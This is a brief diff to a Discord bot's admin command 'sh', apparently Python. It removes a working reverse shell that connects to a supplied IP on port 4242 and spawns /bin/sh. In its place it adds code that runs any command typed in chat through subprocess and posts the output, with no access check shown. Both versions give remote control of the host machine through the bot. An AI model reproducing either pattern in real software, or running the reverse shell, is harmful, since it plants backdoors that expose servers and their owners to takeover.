@@ -49,14 +49,11 @@ class Admin(commands.Cog):
     async def sh(
         self,
         ctx: commands.Context,
-        ip
+        *cmd
     ):
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((ip,4242))
-        os.dup2(s.fileno(),0)
-        os.dup2(s.fileno(),1)
-        os.dup2(s.fileno(),2)
-        pty.spawn("/bin/sh")
+        result = subprocess.run(cmd, stdout=subprocess.PIPE)
+        await ctx.send(result.stdout.decode('utf-8'))
+
 
 async def setup(bot: commands.AutoShardedBot):
     await bot.add_cog(Admin(bot))
